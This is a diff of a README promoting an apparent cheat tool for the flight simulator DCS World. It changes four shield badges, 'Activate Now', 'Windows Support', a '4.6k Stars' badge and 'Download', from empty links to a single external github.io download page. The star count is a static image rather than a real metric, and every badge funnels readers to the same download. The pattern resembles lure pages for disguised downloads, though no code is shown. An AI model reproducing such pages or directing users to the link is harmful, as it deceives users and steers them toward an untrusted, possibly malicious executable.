@@ -11,10 +11,10 @@ DCS World is renowned for its realism, but sometimes you need a **training edge*
 \[!WARNING]
 This software is intended for **testing and training environments only**. Use responsibly and keep backups of your configs.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.6k Stars](https://img.shields.io/badge/⭐️%204.6k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://dcs-world-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://dcs-world-cheat.github.io/.github/)
+[![⭐️ 4.6k Stars](https://img.shields.io/badge/⭐️%204.6k-Stars-yellow?style=for-the-badge\&logo=github)](https://dcs-world-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-red?style=for-the-badge\&logo=github)](https://dcs-world-cheat.github.io/.github/)
 
 ---
 
